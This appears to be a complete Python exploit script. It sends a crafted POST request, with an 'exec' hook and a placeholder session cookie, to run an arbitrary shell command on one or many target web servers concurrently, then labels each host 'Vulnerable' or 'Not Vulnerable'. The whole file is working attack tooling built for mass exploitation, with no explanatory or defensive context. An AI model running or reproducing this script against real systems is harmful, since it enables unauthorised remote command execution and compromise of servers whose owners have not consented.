#!/usr/bin/env python3

import argparse
import requests
import sys
import time
import concurrent.futures

# ANSI color codes
GREEN = "\033[32m"
RED = "\033[31m"
YELLOW = "\033[33m"
BOLD = "\033[1m"
RESET = "\033[0m"

# Function to parse command line options
def parse_options():
    parser = argparse.ArgumentParser(description="Execute commands on target URLs.")
    parser.add_argument('-f', '--file', dest='file', help='File containing target URLs')
    parser.add_argument('-u', '--url', dest='url', help='Single target URL')
    parser.add_argument('-c', '--cmd', dest='cmd', help='Command to execute', required=True)
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
    parser.add_argument('--headers', nargs='+', help='Custom headers in the format: key:value', default=[])
    parser.add_argument('--retry', type=int, default=1, help='Number of retries if a request fails (default: 1)')
    parser.add_argument('--threads', type=int, default=5, help='Number of concurrent threads (default: 5)')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout in seconds (default: 10)')
    return parser.parse_args()

# Function to send the POST request and retrieve the output
def execute_command(url, cmd, headers=None, retries=1, verbose=False, timeout=10):
    headers = headers or {}
    data = {"sid": "foo", "hhook": "exec", "text": cmd}
    cookies = {"sid": "foo"}

    for attempt in range(retries):
        try:
            if verbose:
                print(f"{YELLOW}[i] Sending command to {url} (Attempt {attempt + 1})...{RESET}")
            response = requests.post(url, data=data, cookies=cookies, headers=headers, timeout=timeout)
            response.raise_for_status()
            return response.text.split('&nbsp;')[1:]
        except requests.exceptions.Timeout:
            print(f"{RED}[!] Timeout on {url}{RESET}")
            return ["Timeout"]
        except requests.RequestException:
            if verbose:
                print(f"{RED}[!] Error on {url}. Retrying...{RESET}")
    return []

# Function to determine if the output indicates a vulnerability
def vulnerable(output):
    return any("vulnerable" in line.lower() for line in output)

# Function to add http/https scheme to a domain if not present
def ensure_http_scheme(target):
    if not target.startswith("http://") and not target.startswith("https://"):
        return "http://" + target  # Default to http, can be adjusted
    return target

# Function to handle multiple targets concurrently
def handle_multiple_targets(targets, cmd, headers, retries, verbose, threads, timeout):
    total_targets = len(targets)

    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        future_to_target = {executor.submit(execute_command, ensure_http_scheme(target), cmd, headers, retries, verbose, timeout): target for target in targets}

        for future in concurrent.futures.as_completed(future_to_target):
            target = future_to_target[future]
            try:
                output = future.result()
                if vulnerable(output):
                    print(f"{GREEN}[+] {BOLD}{target} Vulnerable{RESET}")
                elif "Timeout" in output:
                    print(f"{RED}[-] {BOLD}{target} Timeout{RESET}")
                else:
                    print(f"{RED}[-] {BOLD}{target} Not Vulnerable{RESET}")
            except Exception as exc:
                print(f"{RED}[!] {target} generated an exception: {exc}{RESET}")

    return total_targets

# Main execution flow
options = parse_options()

# Parse custom headers
custom_headers = {}
if options.headers:
    for header in options.headers:
        key, value = header.split(":")
        custom_headers[key.strip()] = value.strip()

if not options.file and not options.url:
    print(f"\n{BOLD}{RED}[i] Usage: {{__file__}} -f <TARGET_FILE> -u <URL> -c <CMD>{RESET}\n")
    sys.exit(1)
elif not options.cmd:
    print(f"\n{BOLD}{RED}[i] Command (-c <CMD>) is required{RESET}\n")
    sys.exit(1)
else:
    print(f"\n{BOLD}[+] Starting vulnerability check...{RESET}")

    if options.file:
        with open(options.file) as file:
            targets = [line.strip() for line in file if line.strip()]
        total = handle_multiple_targets(targets, options.cmd, custom_headers, options.retry, options.verbose, options.threads, options.timeout)
    elif options.url:
        url = ensure_http_scheme(options.url)
        output = execute_command(url, options.cmd, headers=custom_headers, retries=options.retry, verbose=options.verbose, timeout=options.timeout)
        if vulnerable(output):
            print(f"{GREEN}[+] {BOLD}{options.url} Vulnerable{RESET}")
        elif "Timeout" in output:
            print(f"{RED}[-] {BOLD}{options.url} Timeout{RESET}")
        else:
            print(f"{RED}[-] {BOLD}{options.url} Not Vulnerable{RESET}")

    time.sleep(2)  # Wait for 2 seconds before closing the script
    sys.exit()  # Exit the script
